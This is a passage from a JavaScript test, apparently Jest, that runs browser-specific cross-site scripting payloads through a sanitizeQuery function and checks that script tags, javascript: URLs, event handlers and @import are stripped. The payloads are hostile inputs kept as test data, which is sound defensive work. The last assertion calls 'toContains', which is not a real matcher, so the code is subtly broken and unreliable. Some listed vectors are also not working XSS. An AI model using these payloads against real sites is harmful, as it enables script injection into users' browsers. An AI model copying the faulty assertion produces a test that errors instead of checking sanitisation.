      const browserSpecificPayloads = [
        // IE specific
        '<style>@import "javascript:alert(\'XSS\')";</style>',
        '<div style="behavior:url(xss.htc)">XSS</div>',

        // Chrome specific
        '<svg><script>alert(\'XSS\')</script></svg>',
        '<div draggable="true" ondragstart="alert(\'XSS\')">XSS</div>',

        // Firefox specific
        '<xmp><script>alert(\'XSS\')</script></xmp>',
        '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',

        // Safari specific
        '<link rel="stylesheet" href="data:text/css,alert(\'XSS\')">',
        '<style>@import "data:text/css,alert(\'XSS\')";</style>',
      ];

      for (const payload of browserSpecificPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should prevent browser-specific XSS vectors
        expect(sanitized.cleaned).not.toContain('<script>');
        expect(sanitized.cleaned).not.toContain('javascript:');
        expect(sanitized.cleaned).not.toContain('alert(');
        expect(sanitized.cleaned).not.toContain('behavior:');
        expect(sanitized.cleaned).not.toContain('ondragstart=');
        expect(sanitized.cleaned).not.toContains('@import');
      }
    });
  });
});